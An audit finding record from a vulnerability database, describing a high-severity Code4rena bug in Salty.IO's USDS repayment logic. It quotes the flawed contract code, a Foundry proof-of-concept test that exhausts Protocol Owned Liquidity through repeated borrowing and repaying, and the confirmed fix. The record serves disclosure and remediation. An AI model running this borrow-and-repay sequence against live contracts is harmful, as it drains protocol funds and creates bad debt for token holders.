---
# Core Classification
protocol: Salty.IO
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 31111
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-01-salty
source_link: https://code4rena.com/reports/2024-01-salty
github_link: https://github.com/code-423n4/2024-01-salty-findings/issues/137

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 28
finders:
  - Drynooo
  - KingNFT
  - ether\_sky
  - 00xSEV
  - Aymen0909
---

## Vulnerability Title

[H-06] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS

### Overview


The bug report describes a problem where a user can manipulate the system to create bad debt, affecting the price of a stablecoin called USDS. This is caused by a flaw in the contract that handles repaying borrowed USDS. When a user repays their USDS, it is taken from them and kept for burning. However, the contract that handles this process can be tricked into thinking there is more USDS to be burned than there actually is. This can be done by repeatedly borrowing and repaying USDS, causing the contract to sell other assets to cover the supposed increase in USDS to be burned. If these assets are exhausted, the protocol cannot cover bad debt from liquidations, which can negatively impact the price of USDS. To fix this issue, the repaid USDS should be sent directly to the contract that handles burning, instead of being kept in the borrowing contract. The developers have confirmed that they have removed the vulnerable code and implemented this fix.

### Original Finding Content


When a user repays the USDS he has borrowed, it is taken from him and kept for burning. The Liquidizer contract is updated with the new amount repaid. The USDS is burnt whenever the `performUpkeep` function is called on Liquidizer by the Upkeep contract during upkeep.

The USDS collected is sent to the USDS contract which can be burned whenever `burnTokensInContract` is called. The amount of USDS to be burnt in the Liquidizer contract is also increased by the `incrementBurnableUSDS` call. This increases the `usdsThatShouldBeBurned` variable on the Liquidizer.

```solidity
     function repayUSDS( uint256 amountRepaid ) external nonReentrant{
       ...		
       usds.safeTransferFrom(msg.sender, address(usds), amountRepaid);

       // Have USDS remember that the USDS should be burned
       liquidizer.incrementBurnableUSDS( amountRepaid );
       ...
     }
```

During upkeep, the Liquidizer first checks if it has enough USDS balance to burn i.e `usdsBalance >= usdsThatShouldBeBurned`. If it does it burns them else it converts Protocol Owned Liquidity (POL) to USDS and burns it to cover the deficit. Burning POL allows the protocol to cover bad debt from liquidation.

```solidity
function _possiblyBurnUSDS() internal{
        ...
	uint256 usdsBalance = usds.balanceOf(address(this));
	if ( usdsBalance >= usdsThatShouldBeBurned )
	{
		// Burn only up to usdsThatShouldBeBurned.
		// Leftover USDS will be kept in this contract in case it needs to be burned later.
		_burnUSDS( usdsThatShouldBeBurned );
    		usdsThatShouldBeBurned = 0;
	}
	else
	{
		// The entire usdsBalance will be burned - but there will still be an outstanding balance to burn later
		_burnUSDS( usdsBalance );
		usdsThatShouldBeBurned -= usdsBalance;

		// As there is a shortfall in the amount of USDS that can be burned, liquidate some Protocol Owned Liquidity and
		// send the underlying tokens here to be swapped to USDS
		dao.withdrawPOL(salt, usds, PERCENT_POL_TO_WITHDRAW);
		dao.withdrawPOL(dai, usds, PERCENT_POL_TO_WITHDRAW);
	}
}
```

Since the `usdsThatShouldBeBurned` variable will always be increased without increasing the Liquidizer balance, it will always sell POL to cover the increase.

If the POL is exhausted, the protocol cannot cover bad debt generated from liquidations. This will affect the price of USDS negatively.

An attacker can borrow and repay multiple times to exhaust POL and create bad debt or it could just be done over time as users repay their USDS.

### Impact

This will affect the price of USDS negatively.

### Proof of Concept

This test can be run in [CollateralAndLiquidity.t.sol](https://github.com/code-423n4/2024-01-salty/blob/main/src/stable/tests/CollateralAndLiquidity.t.sol).

<details>

```solidity
    function testBurnPOL() public {
        // setup
        vm.prank(address(collateralAndLiquidity));
		usds.mintTo(address(dao), 20000 ether);

		vm.prank(address(teamVestingWallet));
		salt.transfer(address(dao), 10000 ether);

		vm.prank(DEPLOYER);
		dai.transfer(address(dao), 10000 ether);
        // create Protocol Owned Liquidity (POL)
        vm.startPrank(address(dao));
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
		vm.stopPrank();

        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
		bytes32 poolIDB = PoolUtils._poolID(dai, usds);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
		assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);

        // Alice deposits collateral
        vm.startPrank(address(alice));
        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
        weth.approve(address(collateralAndLiquidity), type(uint256).max);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );
        
        // Alice performs multiple borrows and repayments, increasing the 
        // usdsThatShouldBeBurned variable in Liquidizer
        for (uint i; i < 100; i++){
            vm.startPrank(alice);
            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
		    collateralAndLiquidity.borrowUSDS( maxUSDS );
            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
            collateralAndLiquidity.repayUSDS(borrowed);
        }
        
        vm.startPrank(address(upkeep));
        // perform upkeep multiple times to cover bad debt
        // breaks when POL is exhausted
        for(;;){
            (, uint reserve1) = pools.getPoolReserves(dai, usds);
            if(reserve1 * 99 / 100 < 100) break;
            liquidizer.performUpkeep();
        }

        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
    }
```

</details>

### Recommended Mitigation Steps

Send the repaid USDS to the Liquidizer.

**[othernet-global (Salty.IO) confirmed and commented](https://github.com/code-423n4/2024-01-salty-findings/issues/137#issuecomment-1950473170):**
 > The stablecoin framework: /stablecoin, /price_feed, WBTC/WETH collateral, PriceAggregator, price feeds and USDS have been removed:
> 
> https://github.com/othernet-global/salty-io/commit/88b7fd1f3f5e037a155424a85275efd79f3e9bf9
> 


**Status:** Mitigation confirmed. Full details in reports from [0xpiken](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/66), [zzebra83](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/46), and [t0x1c](https://github.com/code-423n4/2024-03-saltyio-mitigation-findings/issues/29).


***

 


### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | Salty.IO |
| Report Date | N/A |
| Finders | Drynooo, KingNFT, ether\_sky, 00xSEV, Aymen0909, 0xRobocop, 0x3b, LeoGold, chaduke, nonseodion, oakcobalt, 1, 2, Jorgect, fnanni, Toshii, lanrebayode77, 0xanmol, djxploit, 0xAlix2, Ephraim, solmaxis69, wangxx2026, klau5, juancito, pkqs90, ayden, israeladelaja |

### Source Links

- **Source**: https://code4rena.com/reports/2024-01-salty
- **GitHub**: https://github.com/code-423n4/2024-01-salty-findings/issues/137
- **Contest**: https://code4rena.com/reports/2024-01-salty

### Keywords for Search

`vulnerability`

